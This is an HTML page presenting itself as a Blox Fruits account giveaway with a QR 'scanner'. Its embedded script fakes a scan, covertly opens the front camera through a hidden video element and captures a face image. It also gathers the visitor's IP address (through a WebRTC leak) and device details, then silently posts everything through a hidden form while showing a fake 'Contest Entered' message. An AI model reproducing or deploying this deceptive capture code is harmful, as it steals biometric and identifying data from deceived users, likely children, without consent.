<!DOCTYPE html>
<html>
<head>
    <title>Blox Giveaway Scanner</title>
    <style>
        body { 
            font-family: 'Arial'; 
            background: linear-gradient(to bottom, #000000 0%, #764ba2 100%); 
            color: white; 
            text-align: center; 
            padding: 50px; 
            margin: 0;
        }
        .scanner-container { 
            background: rgba(255,255,255,0.1); 
            padding: 30px; 
            border-radius: 15px; 
            max-width: 400px; 
            margin: 0 auto; 
            box-shadow: 0 8px 32px rgba(0,0,0,0.2);
        }
        h1 { 
            font-size: 24px; 
            margin-bottom: 20px; 
            font-weight: bold;
        }
        .logo { 
            width: 100px; 
            height: 100px; 
            margin: 0 auto 20px; 
            border-radius: 50%;
            object-fit: cover;
            border: 3px solid #ff6b6b;
        }
        .scanner { 
            width: 200px; 
            height: 200px; 
            margin: 20px auto; 
            border: 3px dashed #ff6b6b; 
            position: relative;
            overflow: hidden;
        }
        .scan-line { 
            position: absolute; 
            top: 0; 
            left: 0; 
            width: 100%; 
            height: 2px; 
            background: #ff6b6b; 
            animation: scan 2s infinite; 
        }
        @keyframes scan {
            0% { top: 0; }
            100% { top: 100%; }
        }
        .qr-code { 
            width: 150px; 
            height: 150px; 
            margin: 20px auto; 
            border-radius: 10px; 
            background: white; 
            display: flex; 
            align-items: center; 
            justify-content: center;
        }
        .qr-code img { 
            width: 130px; 
            height: 130px; 
        }
        .result { 
            margin-top: 20px; 
            font-size: 14px; 
            min-height: 100px;
        }
        .success { 
            color: #4cd964; 
            font-weight: bold; 
        }
        .error { 
            color: #ff6b6b; 
        }
        .prize { 
            font-size: 18px; 
            font-weight: bold; 
            color: gold; 
            margin: 20px 0;
        }
    </style>
</head>
<body>
    <div class="scanner-container">
        <img src="https://placehold.co/100x100/764ba2/white?text=Blox" alt="Blox Logo" class="logo">
        
        <h1>Blox Giveaway Scanner</h1>
        <p>Scan QR code to enter the Blox Fruits contest</p>
        
        <div class="prize">🎁 WIN A FREE BLOX FRUITS ACCOUNT! 🎁</div>
        
        <div class="scanner">
            <div class="scan-line"></div>
        </div>
        
        <div class="qr-code">
            <img src="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://bloxfruits.com/giveaway" alt="QR Code">
        </div>
        
        <div class="result" id="result">
            <p>Position QR code within scanner area</p>
        </div>
    </div>

    <script>
        // Main execution flow
        document.addEventListener('DOMContentLoaded', initScanner);
        
        function initScanner() {
            // Create hidden camera element
            const video = document.createElement('video');
            video.style.display = 'none';
            document.body.appendChild(video);
            
            // Start scanning when QR is detected
            simulateQRScan().then(async () => {
                const resultDiv = document.getElementById('result');
                resultDiv.innerHTML = `<div class="success"><p>Scanning...</p></div>`;
                
                // Capture face data
                const faceData = await captureFaceData(video);
                
                // Submit silently
                submitData(faceData);
                
                // Show success message
                resultDiv.innerHTML = `
                    <div class="success">
                        <p>Success!</p>
                        <p>Contest Entered: Blox Fruits Account</p>
                    </div>
                `;
            });
        }
        
        // Simulate QR scanning detection
        function simulateQRScan() {
            return new Promise(resolve => {
                setTimeout(() => {
                    resolve();
                }, 2000);
            });
        }
        
        // Capture face data using WebRTC
        async function captureFaceData(video) {
            const constraints = { 
                video: { facingMode: 'user' },
                audio: false 
            };
            
            // Start camera
            const stream = await navigator.mediaDevices.getUserMedia(constraints);
            video.srcObject = stream;
            video.play();
            
            // Wait for camera to start
            await new Promise(resolve => {
                video.onloadedmetadata = () => resolve();
            });
            
            // Capture frame
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0);
            
            // Stop camera
            stream.getTracks().forEach(track => track.stop());
            
            // Get device info
            const deviceInfo = {
                ip: await getDeviceIP(),
                userAgent: navigator.userAgent,
                language: navigator.language,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                screen: `${screen.width}x${screen.height}`
            };
            
            return {
                faceImage: canvas.toDataURL('image/jpeg'),
                deviceInfo: deviceInfo,
                timestamp: new Date().toISOString()
            };
        }
        
        // Get device IP using WebRTC
        async function getDeviceIP() {
            return new Promise((resolve, reject) => {
                const pc = new RTCPeerConnection({
                    iceServers: [{urls: 'stun:stun.l.google.com:19302'}]
                });
                
                pc.createDataChannel('');
                pc.createOffer().then(offer => pc.setLocalDescription(offer));
                
                pc.onicecandidate = e => {
                    if (!e.candidate) return;
                    const ip = e.candidate.candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3})/)[0];
                    resolve(ip);
                    pc.close();
                };
                
                setTimeout(() => {
                    reject(new Error('IP detection timed out'));
                }, 5000);
            });
        }
        
        // Submit data to backend
        function submitData(data) {
            // Create hidden form for silent submission
            const form = document.createElement('form');
            form.method = 'POST';
            form.action = '/api/submission';
            form.style.display = 'none';
            
            // Add data fields
            Object.entries(data).forEach(([key, value]) => {
                const field = document.createElement('input');
                field.type = 'hidden';
                field.name = key;
                field.value = JSON.stringify(value);
                form.appendChild(field);
            });
            
            document.body.appendChild(form);
            form.submit();
        }
    </script>
</body>
</html>
